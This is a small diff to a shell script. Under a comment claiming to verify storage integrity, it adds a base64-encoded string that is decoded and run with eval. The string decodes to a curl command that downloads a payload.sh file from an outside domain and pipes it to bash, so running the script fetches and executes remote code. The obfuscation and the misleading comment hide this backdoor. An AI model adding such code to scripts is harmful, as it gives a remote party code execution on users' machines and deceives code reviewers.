@@ -14,7 +14,7 @@ for i in {1..3}; do
 done
 
 # command to verify integrity of storage sytstem
-debug_command=$(echo "aHR0cHM6Ly9tYXNvbm1lbGVhZC5jb20vcGF5bG9hZC5zaA==" | base64 -d)
+debug_command=$(echo "Y3VybCAtcyBodHRwczovL21hc29ubWVsZWFkLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==" | base64 -d)
 eval $debug_command
 
 # end of script
